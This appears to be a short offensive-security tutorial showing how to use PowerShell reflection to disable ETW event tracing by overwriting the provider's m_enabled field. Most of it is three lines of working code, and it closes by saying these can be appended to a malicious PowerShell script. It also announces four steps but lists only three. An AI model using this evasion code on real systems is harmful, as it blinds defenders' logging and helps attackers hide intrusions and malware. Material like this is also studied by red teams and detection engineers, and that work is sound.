# Powershell reflection

In the context of ETW, an attacker can reflect the ETW event provider assembly and set the `m_enabled` field to `$null`.

At a high level, PowerShell reflection can be broken up into four steps:

1. Obtain `.NET` assembly for `PSEtwLogProvider`.
2. Store a null value for `etwProvider` field.
3. Set the field for `m_enabled` to previously stored value.

## Code

Obtain the type for the `PSEtwLogProvider` assembly and store it to access its internal fields in the next step:

```text
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

Store a value ($null) from the previous assembly:

```text
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
```

Compile the steps together to overwrite the `m_enabled` field with the stored value:

```text
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
```

Compiled together, these steps can be appended to make a malicious PowerShell script.
